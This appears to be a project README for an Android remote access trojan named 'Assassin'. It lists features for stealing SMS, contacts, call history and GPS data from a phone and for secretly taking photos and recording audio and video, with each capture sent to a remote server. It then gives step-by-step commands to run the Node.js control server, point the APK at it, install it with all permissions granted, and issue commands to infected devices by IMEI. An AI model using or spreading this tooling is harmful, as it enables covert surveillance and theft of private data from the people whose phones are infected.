# Assassin one of the  best Android RAT 

- beta 1.0.0
- adapter android Lollipop-Pie
- commit issues to me 
## 1. Construction
![assembleApk](https://cdn-std.dprcdn.net/files/acc_737120/1P2KVt)
## Features
- get Sms_List
- send Sms to destinationAddress
- get Calling_History
- get GPS
- get Contacts_List
---- 
#### something that u can do in background
- call someone  
- take a photo then send to server 
- record audio then send to server
- record video then send to server
</br>of course the duration decided by yourself

## 2. Basement/Environment
- Gradle 
- JDK1.8
- AndroidSdk 
- node.js
- npm
## 3. Usage
#### 1.Start up The Server
```
1. git clone git@github.com:honglvt/TalentRAT.git / or https
2. cd the project path
3. cd Server
4. npm install
5. npm start
```
now you can see the terminal show ASSASSIN
----
#### 2.Build the Android apk 
1. confrim that you have prepare the env for building the app
2. connect the android device  to ur PC
3. enable the develop mode on ur android device
4. edit the socket address with</br>
```
use ifconfig to get server IP Address
cd project
vim ./gradle.properties
edit the SERVER_ADDRESS that you got befroe
```
5. on some rom you should also  enable the adb to install the apk
6. if you are not a developer you can install the apk yourself
- post the .apk to your device such as email or other way
- then install the .apk on folder
----
#### 3.Intasll apk 
```
1. cd the project path 
2. ./assembleApk.sh debug    you can choose the arg debug/release
3. ./installNewestApk.sh 
4. open the apk on ur device
5. the most important is that  you should grant all of the permissions on the device
```
## 4. Instruction to client
```
1. cd /Server
2. which node
3. vim ./assassin.js  replace #! /usr/local/bin/node with your own position
4. chmod 777 ./assassin.js
5. ./assassin.js -h
```
```
$ ./assassin.js -h                                                 ‹ruby-2.6.0›
Usage: assassin [options]

Options:
  -V, --version             output the version number
  -a,--assassin <assassin>  select a command post to the clients if you choose the shadow you should input the cmd -t to choose a type between pic/audio/video [sms,contacts,call,gps,shadow] (default: "sms")
  -C,--Clients              show every client info
  -d,--address <address>    input a phone num who you want to send a msg
  -m,--msg <msg>            you should write the msg content, if your command is sms
  -t,--type <type>          select a type between pic/audio/video and you should input the -l to choose the camera lens [pic,audio,video]
  -c,--client <client>      select a client to post the command
  -l,--lens <lens>          which camera lens that you want to open [0,1]
  -h, --help                output usage information
```
### exemples
| cmd        | -a     |
| ---------- | :-----------:  | 
| description| select the command between [sms,contacts,call,gps,shadow]  if you choose the shadow you should also use -t to choose a type between pic/audio/video     | 
|  example   | ‘’./assassin.js -a sms‘’  ‘’ ./assassin.js -a shadow -t pic ‘’   | 
|  result   | ERROR:you should input a type with -c to choose a client that you want to send cmd    | 
----

| cmd        | -C     |
| ---------- | :-----------:  | 
| description| show every client info    | 
|  example   | ‘’./assassin.js -C ‘’   | 
|  result   | {IMEI:9525238415950202,brand:Nokia,model:CAL-20,version:9.0}   | 
----

| cmd        | -c     |
| ---------- | :-----------:  | 
| description| select a client with its IMEI to post the command    | 
|  example   | ‘’./assassin.js -a sms -c  9525238415950202 ‘’   | 
|  result   | { command: 'send_sms_list', IMEI: '184859203' }  | 
----

## 5. Prompt

- keep node server alive when you send a command
- cmd with ./assassin.js will return a Json data  you can do whatever with the response 
- if you want to get a pic or video you should type the cmd as follow:
  - ./assassin.js -a shadow -c 123456 -t pic -l 0
  - then you can find the pic has saved on the */project/Server/public/images/xxxx.jpeg'
  - the same with other shadow
- the duration in recording video or audio decided by yourself
## 6. Commands

# Screen Shot
### server
![server](https://cdn-std.dprcdn.net/files/acc_737120/tKCGxc)
---
### assembleApk
![assembleApk](https://cdn-std.dprcdn.net/files/acc_737120/BtN0Eb)
---
### installApk
![installApk](https://cdn-std.dprcdn.net/files/acc_737120/qzZ6yC)
---
### client connect to server
![connect](https://cdn-std.dprcdn.net/files/acc_737120/7AfwLH)
---
### executeCmd
![executeCmd](https://cdn-std.dprcdn.net/files/acc_737120/ot6gOq)
